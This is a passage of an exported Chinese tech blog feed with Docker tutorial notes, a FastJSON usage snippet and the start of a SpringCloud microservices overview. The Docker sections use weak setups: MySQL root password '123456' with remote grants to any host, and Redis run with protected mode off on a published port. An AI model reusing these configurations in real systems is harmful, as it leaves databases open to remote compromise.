<h2 id="3-5-仓库"><a href="#3-5-仓库" class="headerlink" title="3.5 仓库"></a>3.5 仓库</h2><h3 id="3-5-1-仓库的基本概念"><a href="#3-5-1-仓库的基本概念" class="headerlink" title="3.5.1 仓库的基本概念"></a>3.5.1 仓库的基本概念</h3><p>仓库是集中存放镜像文件的场所，有时候会把仓库和仓库注册服务器 (Registry)看做同一事物，并不严格区分。实际上，仓库注册服务 器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像 有不同的标签(tag); 仓库分为公开仓库(Public)和私有仓库(Private)两种形式; 最大的公开仓库是 Docker Hub (<a href="https://hub.docker.com/)%EF%BC%8C%E5%AD%98%E6%94%BE%E4%BA%86">https://hub.docker.com/)，存放了</a> 数量庞大的镜像供用户下载; 当然，用户也可以在本地网络内创建一个私有仓库;当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公 有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只 需要从仓库上 pull 下来即可;<br> 注:Docker 仓库的概念跟 Git 类似，注册服务器也类似于 GitHub 这 样的托管服务;</p>
<h3 id="3-5-2-仓库的日常操作"><a href="#3-5-2-仓库的日常操作" class="headerlink" title="3.5.2 仓库的日常操作"></a>3.5.2 仓库的日常操作</h3><p>用户可通过 docker search 命令来查找官方仓库中的镜像:<br> docker search rabbitmq </p>
<p>可以看到返回了很多包含关键字的镜像，其中包括镜像名字、描述、 星级(表示该镜像的受欢迎程度)、是否官方创建、是否自动创建; 官方的镜像说明是官方项目组创建和维护的，automated 资源允许用 户验证镜像的来源和内容; </p>
<p>根据是否是官方提供，可将镜像资源分为两类;</p>
<p>一种是类似 centos 这样的基础镜像，被称为基础或根镜像。这些基 础镜像是由 Docker 公司创建、验证、支持、提供。这样的镜像往往 使用单个单词作为名字;<br> 还有一种类型，比如 tianon&#x2F;centos 镜像，它是由 Docker 的用户创 建并维护的，往往带有用户名称前缀。可以通过前缀 user_name&#x2F; 来 指定使用某个用户提供的镜像，比如 tianon 用户;</p>
<p>并利用 docker pull 命令来将它下载到本地:</p>
<p>docker pull rabbitmq </p>
<p>docker pull centos</p>
<h1 id="第四章-Docket使用实例"><a href="#第四章-Docket使用实例" class="headerlink" title="第四章 Docket使用实例"></a>第四章 Docket使用实例</h1><h2 id="4-1-Docker-安装-MySQL"><a href="#4-1-Docker-安装-MySQL" class="headerlink" title="4.1 Docker 安装 MySQL"></a>4.1 Docker 安装 MySQL</h2><p>#下载 MySQL 镜像:<br> docker pull mysql:latest (安装的是 mysql 8.0)<br> docker run -p 3306:3306 -e MYSQL_DATABASE&#x3D;workdb -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d mysql:latest<br> 其中-e 是指定环境变量<br> #进入容器:<br> docker exec -it 3e8bf7392b4e bash<br> #登录 MySQL:<br> mysql -u root -p<br> #修改密码:<br> ALTER USER ‘root‘@’localhost’ IDENTIFIED BY ‘123456’; #授权远程登录访问:<br> CREATE USER ‘wkcto‘@’%’ IDENTIFIED WITH mysql_native_password BY ‘123456’;<br> GRANT ALL PRIVILEGES ON <em>.</em> TO ‘ wkcto‘@’%’;</p>
<h2 id="4-2-Docker-安装-Nginx"><a href="#4-2-Docker-安装-Nginx" class="headerlink" title="4.2 Docker 安装 Nginx"></a>4.2 Docker 安装 Nginx</h2><p>#下载 Nginx 镜像:<br> docker pull nginx<br> docker run -d -p 80:80 nginx<br> #进入容器:<br> docker exec -it 3e8bf7392b4e bash<br> #浏览器访问 Nginx:<br> <a href="http://192.168.230.128/">http://192.168.230.128:80</a><br> #Nginx 部署静态网站:<br> 将 linux 的文件拷贝到 docker 容器某个目录下:<br> docker cp &#x2F;root&#x2F;test.html bf8a58328e18:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</p>
<h2 id="4-3-Dokcer-安装-Zookeeper"><a href="#4-3-Dokcer-安装-Zookeeper" class="headerlink" title="4.3 Dokcer 安装 Zookeeper"></a>4.3 Dokcer 安装 Zookeeper</h2><p>#下载 Zookeeper 镜像:<br> docker pull zookeeper<br> docker run -p 2181:2181 -d zookeeper </p>
<p>#进入容器:<br> docker exec -it 3e8bf7392b4e bash </p>
<p>#客户端工具访问 Zookeeper:</p>
<h2 id="4-4-Docker-安装-ActiveMQ"><a href="#4-4-Docker-安装-ActiveMQ" class="headerlink" title="4.4 Docker 安装 ActiveMQ"></a>4.4 Docker 安装 ActiveMQ</h2><p>#下载 ActiveMQ 镜像:<br> docker pull webcenter&#x2F;activemq </p>
<p>docker run -p 8161:8161 -d activemq </p>
<p>#进入容器:<br> docker exec -it 3e8bf7392b4e bash </p>
<p>#浏览器访问 activemq:</p>
<h1 id="第五章-Docker-自定义镜像"><a href="#第五章-Docker-自定义镜像" class="headerlink" title="第五章 Docker 自定义镜像"></a>第五章 Docker 自定义镜像</h1><h2 id="5-1-认识-Dockerfile-文件"><a href="#5-1-认识-Dockerfile-文件" class="headerlink" title="5.1 认识 Dockerfile 文件"></a>5.1 认识 Dockerfile 文件</h2><p>Dockerfile 用于构建 Docker 镜像，Dockerfile 文件是由一行行命令语句 组成，基于这些命令即可以构建一个镜像，比如下面就是一个</p>
<p>Dockefile 文件样例:</p>
<p>FROM XXX&#x2F;jdk:8<br> MAINTAINER docker_user<br> ENV JAVA_HOME &#x2F;usr&#x2F;local&#x2F;java<br> ADD apache-tomcat-8.0.32.tar.gz &#x2F;usr&#x2F;local&#x2F; RUN mv apache-tomcat-8.0.32 tomcat8<br> EXPOSE 8080<br> RUN chmod u+x &#x2F;usr&#x2F;local&#x2F;tomcat8&#x2F;bin&#x2F;*.sh CMD &#x2F;usr&#x2F;local&#x2F;tomcat8&#x2F;bin&#x2F;catalina.sh start</p>
<h2 id="5-2-Dockerfile-的基本结构"><a href="#5-2-Dockerfile-的基本结构" class="headerlink" title="5.2 Dockerfile 的基本结构"></a>5.2 Dockerfile 的基本结构</h2><p>一般的，Dockerfile 分为四部分:</p>
<ul>
<li>基础镜像信息;</li>
<li>维护者信息;</li>
<li>镜像操作指令;</li>
<li>容器启动时执行指令;</li>
</ul>
<h2 id="5-3-Dockerfile-指令"><a href="#5-3-Dockerfile-指令" class="headerlink" title="5.3 Dockerfile 指令"></a>5.3 Dockerfile 指令</h2><p><strong>FROM</strong></p>
<p>格式为 FROM <image> 或 FROM <image>:<tag><br> Dockerfile 文件的第一条指令必须为 FROM 指令。并且，如果在同一 个 Dockerfile 中创建多个镜像时，可以使用多个 FROM 指令(每个镜 像一次);<br> **MAINTAINER<br>** 格式为 MAINTAINER <name>，指定维护者信息;<br> **ENV<br>** 格式为 ENV <key> <value>，指定一个环境变量，会被后续 RUN 指令 使用，并在容器运行时保持;<br> **ADD<br>** 格式为 ADD <src> <dest>;<br> 复制指定的<src>到容器中的<dest>;<br> **EXPOSE<br>** 格式为 EXPOSE <port> [<port>…]</p>
<p>告诉 Docker 服务端容器暴露的端口号，供互联系统使用，在启动容 器时需要通过 -p映射端口，Docker 主机会自动分配一个端口转发到 指定的端口;<br> <strong>RUN</strong></p>
<p>格式为 RUN <command><br> RUN 指令将在当前镜像基础上执行指定命令，并提交为新的镜像， 当命令较长时可以使用 \ 来换行;<br> **CMD<br>** 指定启动容器时执行的命令，每个 Dockerfile 只能有一条 CMD 命令。 如果指定了多条命令，只有最后一条会被执行。 如果用户启动容器时候指定了运行的命令，则会覆盖掉 CMD 指定的 命令。</p>
<h2 id="5-4-Dockerfile-自定义镜像"><a href="#5-4-Dockerfile-自定义镜像" class="headerlink" title="5.4 Dockerfile 自定义镜像"></a>5.4 Dockerfile 自定义镜像</h2><h3 id="5-4-1-自定义-JDK-镜像"><a href="#5-4-1-自定义-JDK-镜像" class="headerlink" title="5.4.1 自定义 JDK 镜像"></a>5.4.1 自定义 JDK 镜像</h3><p>FROM centos:latest<br> MAINTAINER wkcto<br> ADD jdk-8u121-linux-x64.tar.gz &#x2F;usr&#x2F;local<br> ENV JAVA_HOME &#x2F;usr&#x2F;local&#x2F;jdk1.8.0_121<br> ENV CLASSPATH $JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar ENV PATH $PATH:$JAVA_HOME&#x2F;bin<br> CMD java -version</p>
<p>构建镜像:docker build -t wkcto_jdk1.8.0_121 . </p>
<p>运行镜像:docker run -d ac84bde53958</p>
<h3 id="5-4-2-自定义-Tomcat-镜像"><a href="#5-4-2-自定义-Tomcat-镜像" class="headerlink" title="5.4.2 自定义 Tomcat 镜像"></a>5.4.2 自定义 Tomcat 镜像</h3><p>定义 Dockerfile 文件:</p>
<p>FROM wkcto_jdk1.8.0_121<br> MAINTAINER wkcto<br> ADD apache-tomcat-8.5.24.tar.gz &#x2F;usr&#x2F;local&#x2F;<br> ENV CATALINA_HOME &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24<br> ENV PATH $PATH:$CATALINA_HOME&#x2F;lib:$CATALINA_HOME&#x2F;bin EXPOSE 8080<br> CMD &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;bin&#x2F;catalina.sh run</p>
<p>构建镜像:docker build -t wkcto-tomcat-8.5.24 . </p>
<p>运行镜像:docker run -d -p 8080:8080 ab41b5f48256</p>
<h3 id="5-4-3-自定义-MySQL-镜像"><a href="#5-4-3-自定义-MySQL-镜像" class="headerlink" title="5.4.3 自定义 MySQL 镜像"></a>5.4.3 自定义 MySQL 镜像</h3><p>定义 Dockerfile 文件:</p>
<p>FROM centos:centos6<br> MAINTAINER wkcto<br> RUN yum install mysql-server mysql -y RUN &#x2F;etc&#x2F;init.d&#x2F;mysqld start &amp;&amp;\</p>
<p>mysql -e “grant all privileges on <em>.</em> to ‘root‘@’%’ identified by ‘123456’ WITH GRANT OPTION ;”&amp;&amp;\</p>
<p>mysql -e “grant all privileges on <em>.</em> to ‘root‘@’localhost’ identified by ‘123456’ WITH GRANT OPTION ;”&amp;&amp;\</p>
<p>mysql -uroot -p123456 -e “show databases;” EXPOSE 3306</p>
<p>CMD &#x2F;usr&#x2F;bin&#x2F;mysqld_safe </p>
<p>构建镜像:docker build -t wkcto-mysql .</p>
<p>运行镜像:docker run -d -p 3306:3306 09ce279d92df </p>
<h3 id="5-4-4-自定义-Redis-镜像"><a href="#5-4-4-自定义-Redis-镜像" class="headerlink" title="5.4.4 自定义 Redis 镜像"></a>5.4.4 自定义 Redis 镜像</h3><p> 定义 Dockerfile 文件:</p>
<p>FROM centos:latest<br> MAINTAINER wkcto<br> RUN yum install epel-release -y &amp;&amp; yum install redis -y &amp;&amp; yum install net-tools -y EXPOSE 6379<br> CMD &#x2F;usr&#x2F;bin&#x2F;redis-server –protected-mode no</p>
<p>构建镜像:docker build -t wkcto-redis . </p>
<p>运行镜像:docker run -d -p 6379:6379 390583cf0531</p>
<h2 id="5-5-镜像发布到仓库"><a href="#5-5-镜像发布到仓库" class="headerlink" title="5.5 镜像发布到仓库"></a>5.5 镜像发布到仓库</h2><h3 id="5-5-1-阿里云容器镜像仓库"><a href="#5-5-1-阿里云容器镜像仓库" class="headerlink" title="5.5.1 阿里云容器镜像仓库"></a>5.5.1 阿里云容器镜像仓库</h3><p>网址:<a href="https://dev.aliyun.com/">https://dev.aliyun.com</a></p>
<h3 id="5-5-2-注册阿里云镜像仓库"><a href="#5-5-2-注册阿里云镜像仓库" class="headerlink" title="5.5.2 注册阿里云镜像仓库"></a>5.5.2 注册阿里云镜像仓库</h3><p>如果没有阿里云账号，需要注册一个阿里云账号; 也可以使用淘宝账号、支付宝账号登录;</p>
<h3 id="5-5-3-发布镜像阿里云镜像仓库"><a href="#5-5-3-发布镜像阿里云镜像仓库" class="headerlink" title="5.5.3 发布镜像阿里云镜像仓库"></a>5.5.3 发布镜像阿里云镜像仓库</h3><p>登录阿里云镜像，进入管理中心，在自己我管理中心中，左侧点击镜 像仓库菜单，如果自己没有镜像仓库的话，需要创建一个镜像仓库; 对自己的镜像仓库点击管理链接，按照操作指南进行操作即可;</p>
<ol>
<li><p>登录阿里云 Docker Registry</p>
<p>docker login --username&#x3D;<a href="mailto:&#x68;&#x69;&#x33;&#x35;&#51;&#x33;&#x31;&#x37;&#x31;&#x30;&#x40;&#97;&#108;&#x69;&#121;&#x75;&#x6e;&#46;&#x63;&#111;&#109;">&#x68;&#x69;&#x33;&#x35;&#51;&#x33;&#x31;&#x37;&#x31;&#x30;&#x40;&#97;&#108;&#x69;&#121;&#x75;&#x6e;&#46;&#x63;&#111;&#109;</a> registry.cn-qingdao.aliyuncs.com</p>
<p>用于登录的用户名为阿里云账号全名，密码为开通服务时设置的密码。 您可以在产品控制台首页修改登录密码。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131397.png" alt="image-20201217011107880"></p>
</li>
<li><p>将镜像推送到 Registry</p>
</li>
</ol>
<p>docker tag [ImageId] registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:[ 镜 像 版 本 号 ] docker push registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:[镜像版本号] </p>
<p>请根据实际镜像信息替换示例中的[ImageId]和[镜像版本号]参数。</p>
<p>imageId: a78da0202f84</p>
<p>docker tag a78da0202f84 registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:latest docker push registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:latest</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131398.png" alt="image-20201217011146337"></p>
<h3 id="5-5-4-Docker-hub-镜像加速"><a href="#5-5-4-Docker-hub-镜像加速" class="headerlink" title="5-5-4 Docker hub 镜像加速"></a>5-5-4 Docker hub 镜像加速</h3><p>&#x2F;etc&#x2F;docker&#x2F;daemon.json</p>
<p>{“registry-mirrors”: [“<a href="https://gg3gwnry.mirror.aliyuncs.com&quot;]}">https://gg3gwnry.mirror.aliyuncs.com&quot;]}</a></p>
<h1 id="第六章-Docker-应用部署"><a href="#第六章-Docker-应用部署" class="headerlink" title="第六章 Docker 应用部署"></a>第六章 Docker 应用部署</h1><h2 id="6-1-部署一个-SpringBoot-项目"><a href="#6-1-部署一个-SpringBoot-项目" class="headerlink" title="6.1 部署一个 SpringBoot 项目"></a>6.1 部署一个 SpringBoot 项目</h2><ol>
<li><p>将开发的 springboot 程序打成 jar 包或者 war 包;</p>
</li>
<li><p>将打好的 jar 包或 war 包上传到 Linux 某个目录下，比如:&#x2F;root&#x2F;docker</p>
</li>
<li><p>定义 Dockerfile 文件，用于创建项目镜像;</p>
</li>
</ol>
<h2 id="6-2-Docker-部署-Jar-包-SpringBoot-程序"><a href="#6-2-Docker-部署-Jar-包-SpringBoot-程序" class="headerlink" title="6-2 Docker 部署 Jar 包 SpringBoot 程序"></a>6-2 Docker 部署 Jar 包 SpringBoot 程序</h2><h3 id="6-2-1-定义-Jar-包程序-Dockerfile-文件"><a href="#6-2-1-定义-Jar-包程序-Dockerfile-文件" class="headerlink" title="6-2-1 定义 Jar 包程序 Dockerfile 文件"></a>6-2-1 定义 Jar 包程序 Dockerfile 文件</h3><p>FROM wkcto_jdk1.8.0_121<br> MAINTAINER wkcto<br> ADD springboot-web-1.0.0.jar &#x2F;opt<br> RUN chmod +x &#x2F;opt&#x2F;springboot-web-1.0.0.jar CMD java -jar &#x2F;opt&#x2F;springboot-web-1.0.0.jar</p>
<h3 id="6-2-2-构建和运行-Jar-包程序的镜像"><a href="#6-2-2-构建和运行-Jar-包程序的镜像" class="headerlink" title="6-2-2 构建和运行 Jar 包程序的镜像"></a>6-2-2 构建和运行 Jar 包程序的镜像</h3><p>构建镜像:docker build -t springboot-web-jar .</p>
<p>运行容器:docker run -d ac84bde53958</p>
<h3 id="6-2-3-Jar-包程序依赖容器环境准备"><a href="#6-2-3-Jar-包程序依赖容器环境准备" class="headerlink" title="6-2-3 Jar 包程序依赖容器环境准备"></a>6-2-3 Jar 包程序依赖容器环境准备</h3><p>运行 Redis 容器:docker run -p 6379:6379 -d redis</p>
<p>运行 MySQL 容器:docker run -p 3306:3306 -e MYSQL_DATABASE&#x3D;workdb -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d mysql:latest<br> **修改容器保存:**docker commit 容器 id xxx(镜像名:tagxxx)</p>
<p>比如:docker commit b034f6d23833 wkcto_mysql_new </p>
<h3 id="6-2-4-运行-Docker-化的-Jar-包程序"><a href="#6-2-4-运行-Docker-化的-Jar-包程序" class="headerlink" title="6-2-4 运行 Docker 化的 Jar 包程序"></a>6-2-4 运行 Docker 化的 Jar 包程序</h3><p>通过 windows 的浏览器访问，验证 SpringBoot 项目是否可以正常访问;</p>
<h2 id="6-3-Docker-部署-War-包-SpringBoot-程序"><a href="#6-3-Docker-部署-War-包-SpringBoot-程序" class="headerlink" title="6-3 Docker 部署 War 包 SpringBoot 程序"></a>6-3 Docker 部署 War 包 SpringBoot 程序</h2><h3 id="6-3-1-定义-War-包程序-Dockerfile-文件"><a href="#6-3-1-定义-War-包程序-Dockerfile-文件" class="headerlink" title="6-3-1 定义 War 包程序 Dockerfile 文件"></a>6-3-1 定义 War 包程序 Dockerfile 文件</h3><p>FROM wkcto-tomcat-8.5.24<br> MAINTAINER wkcto<br> ADD springboot-web-1.0.0.war &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;webapps EXPOSE 8080<br> CMD &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;bin&#x2F;catalina.sh run</p>
<h3 id="6-3-2-构建和运行-War-包程序的镜像"><a href="#6-3-2-构建和运行-War-包程序的镜像" class="headerlink" title="6-3-2 构建和运行 War 包程序的镜像"></a>6-3-2 构建和运行 War 包程序的镜像</h3><p>构建镜像:docker build -t springboot-web-war .</p>
<h3 id="6-3-3-War-包程序依赖容器环境准备"><a href="#6-3-3-War-包程序依赖容器环境准备" class="headerlink" title="6-3-3 War 包程序依赖容器环境准备"></a>6-3-3 War 包程序依赖容器环境准备</h3><p>与上面部署 Jar 程序依赖的容器环境一样;</p>
<h3 id="6-3-4-运行-Docker-化的-War-包程序"><a href="#6-3-4-运行-Docker-化的-War-包程序" class="headerlink" title="6-3-4 运行 Docker 化的 War 包程序"></a>6-3-4 运行 Docker 化的 War 包程序</h3><p>通过 windows 的浏览器访问，验证 SpringBoot 项目是否可以正常访问; springboot-web-1.0.0.war → springboot-web-1.0.0</p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJSON</title>
    <url>/2021/12/21/Java/FastJSON/</url>
    <content><![CDATA[<h1 id="FastJSON"><a href="#FastJSON" class="headerlink" title="FastJSON"></a>FastJSON</h1><h3 id="将Java对象转换为JSON格式"><a href="#将Java对象转换为JSON格式" class="headerlink" title="将Java对象转换为JSON格式"></a>将Java对象转换为JSON格式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">     </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;AGE&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date dateOfBirth;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> age, String fullName, Date dateOfBirth)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.fullName= fullName;</span><br><span class="line">        <span class="built_in">this</span>.dateOfBirth = dateOfBirth;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 标准 getters &amp; setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> List&lt;Person&gt; listOfPersons = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Person&gt;();</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUp</span><span class="params">()</span> &#123;</span><br><span class="line">    listOfPersons.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">15</span>, <span class="string">&quot;John Doe&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">    listOfPersons.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">20</span>, <span class="string">&quot;Janette Doe&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">whenJavaList_thanConvertToJsonCorrect</span><span class="params">()</span> &#123;</span><br><span class="line">    String jsonOutput= JSON.toJSONString(listOfPersons);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">[  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="string">&quot;AGE&quot;</span>:<span class="number">15</span>,</span><br><span class="line">        <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1468962431394</span>,</span><br><span class="line">        <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;John Doe&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="string">&quot;AGE&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1468962431394</span>,</span><br><span class="line">        <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Janette Doe&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h2 id="String转化为JSONObject"><a href="#String转化为JSONObject" class="headerlink" title="String转化为JSONObject"></a>String转化为JSONObject</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span>JSONObject.parseObject(String)</span><br></pre></td></tr></table></figure>



<h3 id="创建JSON对象"><a href="#创建JSON对象" class="headerlink" title="创建JSON对象"></a>创建JSON对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">    <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonOutput</span> <span class="operator">=</span> jsonArray.toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">[</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="string">&quot;AGE&quot;</span>:<span class="string">&quot;10&quot;</span>,</span><br><span class="line">      <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;2016/12/12 12:12:12&quot;</span>,</span><br><span class="line">      <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Doe 0&quot;</span></span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="string">&quot;AGE&quot;</span>:<span class="string">&quot;10&quot;</span>,</span><br><span class="line">      <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;2016/12/12 12:12:12&quot;</span>,</span><br><span class="line">      <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Doe 1&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="JSONObject-转对象"><a href="#JSONObject-转对象" class="headerlink" title="JSONObject 转对象"></a>JSONObject 转对象</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IdentifyRequest</span> <span class="variable">identifyRequest</span> <span class="operator">=</span> JSON.toJavaObject(jsonObject, IdentifyRequest.class);</span><br></pre></td></tr></table></figure>

<h2 id="ObjectMapper"><a href="#ObjectMapper" class="headerlink" title="ObjectMapper"></a>ObjectMapper</h2><p>fastJson 没有驼峰对应规则</p>
<p><a href="https://www.jb51.net/article/121697.htm">https://www.jb51.net/article/121697.htm</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud</title>
    <url>/2021/12/21/Java/SpringCloud/</url>
    <content><![CDATA[<h1 id="第一章-微服务架构概述"><a href="#第一章-微服务架构概述" class="headerlink" title="第一章 微服务架构概述"></a>第一章 微服务架构概述</h1><h2 id="1-1-系统进化理论概述"><a href="#1-1-系统进化理论概述" class="headerlink" title="1.1 系统进化理论概述"></a>1.1 系统进化理论概述</h2><p><strong>集中式系统：</strong></p>
<p>集中式系统也叫单体应用，就是把所有的程序、功能、模块都集中到一个项目中，部署在一台服务器上，从而对外提供服务；</p>
<p><strong>分布式系统</strong></p>
<p>分布式系统就是把所有的程序、功能拆分成不同的子系统，部署在多台不同的服务器上，这些子系统相互协作共同对外提供服务，而对用户而言他并不知道后台是多个子系统和多台服务器在提供服务，在使用上和集中式系统一样；</p>
<p>集中式系统跟分布式系统是相反的两个概念，他们的区别体现在“合”与“分”。</p>
<h2 id="1-2-系统进化理论背景"><a href="#1-2-系统进化理论背景" class="headerlink" title="1.2 系统进化理论背景"></a>1.2 系统进化理论背景</h2><p>系统进化的背景与中国互联网用户规模庞大有巨大关系，中国互联网用户规模有7.7亿，庞大的用户访问量对系统的架构设计是巨大的挑战； </p>
<p>产品或者网站初期，通常功能较少，用户量也不多，所以一般按照单体应用进行设计和开发，按照经典的MVC三层架构设计；</p>
<p>随着业务的发展，应用功能的增加，访问用户的增多，传统的采用集中式系统进行开发的方式就不再适用了，因为在这种情况下，集中式系统就会逐步变得非常庞大，很多人维护这么一个系统，开发、测试、上线都会造成很大问题，比如代码冲突，代码重复，逻辑错综混乱，代码逻辑复杂度增加，响应新需求的速度降低，隐藏的风险增大；</p>
<p>所以需要按照业务维度进行应用拆分，采用分布式开发，每个应用专职于做某一些方面的事情，比如将一个集中式系统拆分为用户服务、订单服务、产品服务、交易服务等，各个应用服务之间通过相互调用完成某一项业务功能。</p>
<h2 id="1-3-什么是微服务架构"><a href="#1-3-什么是微服务架构" class="headerlink" title="1.3 什么是微服务架构"></a>1.3 什么是微服务架构</h2><p>分布式强调系统的拆分，微服务也是强调系统的拆分，微服务架构属于分布式架构的范畴。</p>
<p>微服务是系统架构上的一种设计风格，它的主旨是将一个原本独立的系统拆分成多个小型服务，这些小型服务都在各自独立的进程中运行，服务间基于HTTP的RESTful API进行通信协作。</p>
<p>被拆分后的每个小型服务都围绕着系统中的某一项业务功能进行构建，并且每个服务都是一个独立的项目，可以进行独立的测试、开发和部署等。</p>
<p>由于每个独立的服务之间使用基于HTTP的作为数据通信协作的基础，所以这些微服务可以使用不同的语言来开发。</p>
<h2 id="1-4-微服务架构的优缺点"><a href="#1-4-微服务架构的优缺点" class="headerlink" title="1.4 微服务架构的优缺点"></a>1.4 微服务架构的优缺点</h2><p>优点：</p>
<ol>
<li><p>我们知道微服务架构是将系统中的不同功能模块拆分成多个不同的服务，这些服务进行独立地开发和部署，每个服务都运行在自己的进程内，这样每个服务的更新都不会影响其他服务的运行；</p>
</li>
<li><p>由于每个服务是独立部署的，所以我们可以更准确地监控每个服务的资源消耗情况，进行性能容量的评估，通过压力测试，也很容易发现各个服务间的性能瓶颈所在；</p>
</li>
<li><p>由于每个服务都是独立开发，项目的开发也比较方便，减少代码的冲突、代码的重复，逻辑处理流程也更加清晰，让后续的维护与扩展更加容易；</p>
</li>
<li><p>微服务可以使用不同的编程语言进行开发；</p>
</li>
</ol>
<p>缺点：</p>
<ol>
<li><p>微服务架构增加了系统维护、部署的难度，导致一些功能模块或代码无法复用；</p>
</li>
<li><p>随着系统规模的日渐增长，微服务在一定程度上也会导致系统变得越来越复杂，增加了集成测试的复杂度；</p>
</li>
<li><p>随着微服务的增多，数据的一致性问题，服务之间的通信成本等都凸显了出来；</p>
</li>
</ol>
